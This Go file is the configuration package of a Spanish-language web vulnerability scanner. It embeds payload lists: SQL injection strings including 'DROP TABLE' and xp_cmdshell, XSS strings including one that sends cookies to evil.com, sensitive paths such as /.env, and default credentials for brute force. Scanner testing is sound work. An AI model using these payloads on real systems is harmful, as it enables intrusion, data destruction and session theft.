package config

import (
	"encoding/json"
	"os"
	"time"
)

// Config contiene la configuración del escáner
type Config struct {
	// Configuración de red
	Concurrent int           `json:"concurrent"`
	Timeout    time.Duration `json:"timeout"`

	// User-Agent para las requests
	UserAgent string `json:"user_agent"`

	// Headers adicionales
	Headers map[string]string `json:"headers"`

	// Configuración de tests
	Tests TestConfig `json:"tests"`

	// Configuración de output
	Verbose bool `json:"verbose"`

	// Configuraciones avanzadas
	Language    string `json:"language"`      // Idioma de la interfaz
	LastUsedURL string `json:"last_used_url"` // Última URL escaneada
	AutoSave    bool   `json:"auto_save"`     // Guardar configuración automáticamente
	Theme       string `json:"theme"`         // Tema de la interfaz
	Tutorial    bool   `json:"tutorial"`      // Mostrar tutorial en primer uso
}

// TestConfig configura qué tests ejecutar
type TestConfig struct {
	// Tests existentes (compatibilidad)
	SQLInjection   bool `json:"sql_injection"`
	XSS            bool `json:"xss"`
	BruteForce     bool `json:"brute_force"`
	HTTPHeaders    bool `json:"http_headers"`
	SSLAnalysis    bool `json:"ssl_analysis"`
	CSRFProtection bool `json:"csrf_protection"`
	FileUpload     bool `json:"file_upload"`
	DirTraversal   bool `json:"dir_traversal"`
	InfoDisclosure bool `json:"info_disclosure"`

	// Nuevas categorías OWASP
	InfoGathering   bool `json:"info_gathering"`   // INFO: Recolección de información
	Configuration   bool `json:"configuration"`    // CONF: Verificación de configuración
	IdentityMgmt    bool `json:"identity_mgmt"`    // IDNT: Gestión de identidad
	Authentication  bool `json:"authentication"`   // ATHN: Autenticación
	Authorization   bool `json:"authorization"`    // ATHZ: Autorización
	SessionMgmt     bool `json:"session_mgmt"`     // SESS: Gestión de sesiones
	InputValidation bool `json:"input_validation"` // INPV: Validación de entradas
	ErrorHandling   bool `json:"error_handling"`   // ERRH: Manejo de errores
	Cryptography    bool `json:"cryptography"`     // CRYP: Criptografía
	BusinessLogic   bool `json:"business_logic"`   // BUSL: Lógica de negocio
	ClientSide      bool `json:"client_side"`      // CLNT: Cliente
	APISecurity     bool `json:"api_security"`     // APIT: APIs

	// Configuración de agresividad
	UseAdvancedTests bool `json:"use_advanced_tests"` // Usar tests agresivos y exhaustivos
}

// PayloadConfig contiene los payloads para diferentes ataques
type PayloadConfig struct {
	SQLPayloads       []string     `json:"sql_payloads"`
	XSSPayloads       []string     `json:"xss_payloads"`
	CommonPaths       []string     `json:"common_paths"`
	CommonCredentials []Credential `json:"common_credentials"`
}

// Credential representa credenciales para brute force
type Credential struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

// LoadConfig carga la configuración desde un archivo JSON
func LoadConfig(filename string) (*Config, error) {
	data, err := os.ReadFile(filename)
	if err != nil {
		return nil, err
	}

	var config Config
	err = json.Unmarshal(data, &config)
	if err != nil {
		return nil, err
	}

	// Convertir timeout de string a duration si es necesario
	return &config, nil
}

// DefaultConfig retorna la configuración por defecto
func DefaultConfig() *Config {
	return &Config{
		Concurrent: 10,
		Timeout:    30 * time.Second,
		UserAgent:  "VersaSecurityTest/1.0 (Security Scanner)",
		Headers: map[string]string{
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "en-US,en;q=0.5",
			"Accept-Encoding": "gzip, deflate",
			"Connection":      "keep-alive",
		},
		Tests: TestConfig{
			// Tests existentes
			SQLInjection:   true,
			XSS:            true,
			BruteForce:     false, // Por defecto deshabilitado
			HTTPHeaders:    true,
			SSLAnalysis:    false, // Por defecto deshabilitado
			CSRFProtection: false, // Por defecto deshabilitado
			FileUpload:     false, // Por defecto deshabilitado
			DirTraversal:   false, // Por defecto deshabilitado
			InfoDisclosure: true,

			// Nuevas categorías OWASP (habilitadas por defecto las básicas)
			InfoGathering:   true,  // INFO: Básico y seguro
			Configuration:   true,  // CONF: Básico y seguro
			IdentityMgmt:    false, // IDNT: Puede ser intrusivo
			Authentication:  false, // ATHN: Puede ser intrusivo
			Authorization:   false, // ATHZ: Puede ser intrusivo
			SessionMgmt:     true,  // SESS: Básico y seguro
			InputValidation: true,  // INPV: Incluye SQL/XSS existentes
			ErrorHandling:   true,  // ERRH: Básico y seguro
			Cryptography:    true,  // CRYP: Básico y seguro
			BusinessLogic:   false, // BUSL: Puede ser intrusivo
			ClientSide:      true,  // CLNT: Básico y seguro
			APISecurity:     true,  // APIT: Básico y seguro

			// Configuración de agresividad
			UseAdvancedTests: true, // Usar tests avanzados por defecto para máxima efectividad
		},
		Verbose: false,
		// Configuraciones avanzadas
		Language:    "es", // Español por defecto
		LastUsedURL: "",
		AutoSave:    true,
		Theme:       "default",
		Tutorial:    true, // Mostrar tutorial en primer uso
	}
}

// SaveConfig guarda la configuración en un archivo JSON
func (c *Config) SaveConfig(filename string) error {
	data, err := json.MarshalIndent(c, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile(filename, data, 0644)
}

// UpdateLastUsedURL actualiza la última URL usada
func (c *Config) UpdateLastUsedURL(url string) {
	c.LastUsedURL = url
	if c.AutoSave {
		c.SaveConfig("config.json") // Guardar automáticamente
	}
}

// LoadOrCreateConfig carga la configuración o crea una nueva si no existe
func LoadOrCreateConfig(filename string) (*Config, error) {
	config, err := LoadConfig(filename)
	if err != nil {
		// Si no existe el archivo, crear uno nuevo
		config = DefaultConfig()
		err = config.SaveConfig(filename)
		if err != nil {
			return nil, err
		}
	}
	return config, nil
}

// GetPayloads retorna los payloads por defecto
func GetPayloads() *PayloadConfig {
	return &PayloadConfig{
		SQLPayloads: []string{
			"'",
			"' OR '1'='1",
			"'; DROP TABLE users; --",
			"' UNION SELECT null, username, password FROM users --",
			"admin'--",
			"' OR 1=1 --",
			"') OR ('1'='1",
			"1' OR '1'='1",
			"\" OR \"1\"=\"1",
			"'; EXEC xp_cmdshell('dir'); --",
		},
		XSSPayloads: []string{
			"<script>alert('XSS')</script>",
			"<img src=x onerror=alert('XSS')>",
			"<svg onload=alert('XSS')>",
			"javascript:alert('XSS')",
			"<body onload=alert('XSS')>",
			"<iframe src=javascript:alert('XSS')>",
			"<script>document.location='http://evil.com/'+document.cookie</script>",
			"'><script>alert('XSS')</script>",
			"\"><script>alert('XSS')</script>",
			"<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>",
		},
		CommonPaths: []string{
			"/admin",
			"/admin/",
			"/administrator",
			"/admin.php",
			"/admin/login",
			"/admin/index.php",
			"/wp-admin",
			"/wp-admin/",
			"/login",
			"/login.php",
			"/signin",
			"/dashboard",
			"/panel",
			"/cpanel",
			"/control",
			"/manager",
			"/phpmyadmin",
			"/backup",
			"/backup.zip",
			"/config.php",
			"/.git",
			"/.git/config",
			"/.env",
			"/web.config",
			"/.htaccess",
			"/robots.txt",
			"/sitemap.xml",
			"/crossdomain.xml",
			"/server-status",
			"/server-info",
			"/test.php",
			"/info.php",
			"/phpinfo.php",
		},
		CommonCredentials: []Credential{
			{"admin", "admin"},
			{"admin", "password"},
			{"admin", "123456"},
			{"admin", "admin123"},
			{"administrator", "administrator"},
			{"root", "root"},
			{"root", "toor"},
			{"root", "123456"},
			{"user", "user"},
			{"guest", "guest"},
			{"test", "test"},
			{"demo", "demo"},
			{"admin", ""},
			{"", "admin"},
			{"sa", ""},
			{"postgres", "postgres"},
		},
	}
}

// TUIConfig contiene la configuración específica de la TUI
type TUIConfig struct {
	LastUsedURL  string `json:"last_used_url"`
	LastProtocol bool   `json:"last_protocol"` // true = HTTPS, false = HTTP
	AutoStart    bool   `json:"auto_start"`    // Si debe ir directo al paso 3
}

// LoadTUIConfig carga la configuración de la TUI desde archivo
func LoadTUIConfig() *TUIConfig {
	config := &TUIConfig{
		LastUsedURL:  "",
		LastProtocol: true, // HTTPS por defecto
		AutoStart:    false,
	}

	data, err := os.ReadFile("tui_config.json")
	if err != nil {
		return config // Retornar configuración por defecto si no existe
	}

	json.Unmarshal(data, config)
	return config
}

// SaveTUIConfig guarda la configuración de la TUI en archivo
func SaveTUIConfig(config *TUIConfig) error {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		return err
	}

	return os.WriteFile("tui_config.json", data, 0644)
}
